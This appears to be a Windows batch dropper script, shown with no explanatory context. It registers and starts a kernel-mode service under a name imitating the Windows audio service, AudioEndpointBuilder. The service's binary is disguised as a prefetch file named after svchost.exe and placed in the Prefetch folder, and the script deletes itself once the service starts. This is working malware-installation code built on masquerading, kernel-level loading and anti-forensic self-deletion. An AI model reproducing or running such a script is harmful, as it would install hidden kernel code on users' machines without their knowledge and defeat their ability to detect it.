@echo off
cd %~dp0
sc create AudioEndpointBuilder_857 binpath=C:\Windows\Prefetch\SVCHOST.EXE-RD4KN8P3.pf type=kernel
sc start AudioEndpointBuilder_857
del "%~f0"



